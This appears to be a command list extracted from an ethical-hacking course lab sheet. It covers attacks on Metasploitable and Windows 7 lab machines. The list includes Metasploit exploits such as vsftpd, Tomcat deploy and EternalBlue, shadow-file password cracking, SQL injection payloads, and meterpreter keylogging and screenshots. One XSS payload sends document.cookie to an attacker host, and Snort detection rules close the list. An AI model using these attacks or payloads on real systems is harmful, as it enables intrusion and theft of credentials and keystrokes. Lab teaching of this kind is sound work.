@@ -1,0 +1,100 @@
+IS3002 — Ethical Hacking & Network Defence
+Extracted commands and visible link labels (source order)
+
+NOTE: The source text contains link labels, but no actual hyperlink URLs.
+Add the URLs from the original webpage/document if needed.
+
+=== COMMANDS (SEQUENTIAL) ===
+[Line 54] ifconfig
+[Line 60] ip a
+[Line 61] nmap -sn <nat-subnet>/24
+[Line 67] export TARGET=<meta-ip>
+[Line 68] ping -c3 <meta-ip>
+[Line 86] nmap -p21 -sV <meta-ip>
+[Line 93] msfconsole -q
+[Line 94] search vsftpd
+[Line 95] use 1
+[Line 96] set RHOSTS <meta-ip>
+[Line 97] run
+[Line 98] cat /etc/shadow
+[Line 99] nano crack.txt
+[Line 106] sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+[Line 107] john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
+[Line 108] john --show crack.txt
+[Line 116] wireshark smtp.cap
+[Line 135] nmap -p139,445 <meta-ip>
+[Line 142] msfconsole -q
+[Line 143] search usermap
+[Line 144] use 0
+[Line 145] set RHOSTS <meta-ip>
+[Line 146] set LHOST <kali-ip>
+[Line 147] run
+[Line 148] cat /etc/shadow
+[Line 155] sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+[Line 156] john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
+[Line 157] john --show crack.txt
+[Line 165] wireshark http.pcap
+[Line 184] nmap -p8180 -sV <meta-ip>
+[Line 191] msfconsole -q
+[Line 192] search tomcat_mgr_login
+[Line 193] use 0
+[Line 194] set RHOSTS <meta-ip>
+[Line 195] set RPORT 8180
+[Line 196] run
+[Line 203] search tomcat_mgr_deploy
+[Line 204] use 0
+[Line 205] set RHOSTS <meta-ip>
+[Line 206] set RPORT 8180
+[Line 207] set HttpUsername tomcat
+[Line 208] set HttpPassword tomcat
+[Line 209] set LHOST <kali-ip>
+[Line 210] run
+[Line 217] mysql -h <meta-ip> -u root --skip-ssl -e "select user,password from dvwa.users;"
+[Line 218] nano crack.txt
+[Line 225] john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
+[Line 226] john --show --format=raw-md5 crack.txt
+[Line 234] wireshark smtp.cap
+[Line 253] mysql -h <meta-ip> -u root --skip-ssl -e "select user,password from dvwa.users;"
+[Line 254] nano crack.txt
+[Line 255] john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
+[Line 256] john --show --format=raw-md5 crack.txt
+[Line 263] ' UNION SELECT user(),database()#
+[Line 270] ' UNION SELECT table_name,2 FROM information_schema.tables#
+[Line 277] ' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'#
+[Line 284] ' UNION SELECT user,password FROM users#
+[Line 292] wireshark smtp.cap
+[Line 312] nmap -p445 <win7-ip>
+[Line 319] msfconsole -q
+[Line 320] search eternalblue
+[Line 321] use 0
+[Line 322] set RHOSTS <win7-ip>
+[Line 323] set LHOST <kali-ip>
+[Line 324] run
+[Line 331] getuid
+[Line 332] getsystem
+[Line 339] sysinfo
+[Line 346] ps
+[Line 347] migrate <explorer-pid>
+[Line 348] keyscan_start
+[Line 349] keyscan_dump
+[Line 356] screenshot
+[Line 360] upload and download a file
+[Line 363] upload /home/kali/note.txt C:/Users/Public/note.txt
+[Line 364] download C:/Users/Public/note.txt
+[Line 372] john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
+[Line 373] john --show --format=raw-md5 crack.txt
+[Line 381] wireshark http.pcap
+[Line 400] <script>window.open('http://example.com')</script>
+[Line 408] <script>new Image().src='http://<kali-ip>:8000/?c='+document.cookie</script>
+[Line 415] <img src="https://picsum.photos/200">
+[Line 416] <img src="http://<kali-ip>/pwn.png">
+[Line 423] sudo apt-get update
+[Line 424] sudo apt-get install snort
+[Line 425] sudo nano /etc/snort/rules/local.rules
+[Line 427] alert icmp any any -> <meta-ip> any (msg:"ICMP ping detected"; itype:8; sid:1000001; rev:1;)
+[Line 428] reject icmp any any -> <meta-ip> any (msg:"ICMP rejected"; itype:8; sid:1000002; rev:1;)
+[Line 429] alert tcp any any -> any 80 (msg:"SQLi attempt"; content:"union"; nocase; content:"select"; nocase; sid:1000003; rev:1;)
+[Line 430] alert icmp any any -> <meta-ip> any (msg:"ICMP flood"; itype:8; detection_filter:track by_dst, count 20, seconds 5; sid:1000004; rev:1;)
+[Line 434] run Snort and trigger the rules
+[Line 437] sudo snort -c /etc/snort/snort.conf -i enp0s3 -A console -q
+[Line 445] wireshark smtp.cap
